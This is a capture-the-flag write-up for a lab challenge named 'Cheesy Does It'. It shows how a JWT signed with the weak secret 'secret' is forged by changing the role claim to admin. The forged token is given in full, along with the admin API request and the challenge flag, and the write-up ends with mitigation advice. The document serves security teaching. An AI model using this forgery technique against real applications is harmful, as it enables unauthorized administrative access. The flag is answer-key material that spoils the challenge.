# Cheesy Does It

## Challenge Information

* **Platform:** BugForge
* **Challenge:** Cheesy Does It
* **Category:** Web / Authentication
* **Hint:** JWT

---

## Objective

Gain administrative access by exploiting a weakness in the application's JWT authentication and retrieve the hidden flag.

---

## 1. Inspect the JWT

After logging into the application, I inspected the authentication token stored in the browser's local storage.

The JWT had the following structure:

```text
HEADER.PAYLOAD.SIGNATURE
```

Decoding the token revealed the following header:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

The payload was:

```json
{
  "id": 4,
  "username": "test",
  "role": "user",
  "iat": 1790772580
}
```

The important observation was that the application was using **HS256**, which requires a shared secret to sign and verify the token.

---

## 2. Identify the JWT Secret

The JWT signing secret was found to be:

```text
secret
```

Since the secret was known, it was possible to create a valid JWT with modified claims.

---

## 3. Forge an Administrative JWT

The original token identified the user as:

```json
{
  "id": 4,
  "username": "test",
  "role": "user"
}
```

I modified the privilege-related claims to:

```json
{
  "id": 1,
  "username": "admin",
  "role": "admin",
  "iat": 1790772580
}
```

The modified payload was then signed using the known HS256 secret:

```text
secret
```

This generated the following forged JWT:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MDc3MjU4MH0.brVdXTbgdeeIivwIPnKrOHJk6tIpp7lmCXGyg8Twvfo
```

---

## 4. Replace the Token

I replaced the original JWT in the browser's local storage with the forged administrative token.

After refreshing the application, the application treated the session as an administrator session.

The request to the administrative API could then be observed:

```http
GET /api/admin/users HTTP/2
Host: lab-1790771808434-obov55.labs-app.bugforge.io
Authorization: Bearer <FORGED_JWT>
```

---

## 5. Retrieve the Flag

The administrative endpoint was:

```text
/api/admin/users
```

The response contained an `x-flag` HTTP response header.

Relevant response header:

```http
x-flag: bug{0Sfrl4HdB39gMDnzA1SCZfJdKjtijQi3}
```

The same flag was also present in the response headers of the `/users` and `/orders` requests after gaining administrative access.

---

## Flag

```text
bug{0Sfrl4HdB39gMDnzA1SCZfJdKjtijQi3}
```

---

## Vulnerability Summary

The challenge demonstrates an insecure JWT authentication implementation.

The application used an HS256 JWT with a weak/known signing secret:

```text
secret
```

Because the signing key was known, the JWT could be forged with modified authorization claims such as:

```json
"role": "admin"
```

The server then accepted the forged token and granted administrative access.

### Key Issues

* Weak JWT signing secret
* Trust in client-controlled JWT claims
* Privilege determined by the JWT `role` claim
* Administrative endpoints exposed after JWT manipulation
* Sensitive challenge data exposed through an HTTP response header

---

## Mitigation

A production application should:

1. Use a strong, randomly generated JWT signing secret.
2. Store secrets securely using environment variables or a dedicated secrets manager.
3. Never use predictable values such as `secret`, `password`, or application names as signing keys.
4. Validate the JWT signature before trusting any claims.
5. Explicitly enforce the expected signing algorithm.
6. Perform server-side authorization checks for privileged operations.
7. Avoid exposing sensitive information such as secrets or flags in HTTP response headers.
8. Use appropriate token expiration and rotation mechanisms.

---

## Conclusion

The challenge was solved by identifying the HS256 JWT, discovering the signing secret, forging an administrative JWT by changing the `role` claim, replacing the browser's token, and accessing the administrative API.

The flag was ultimately found in the `x-flag` response header.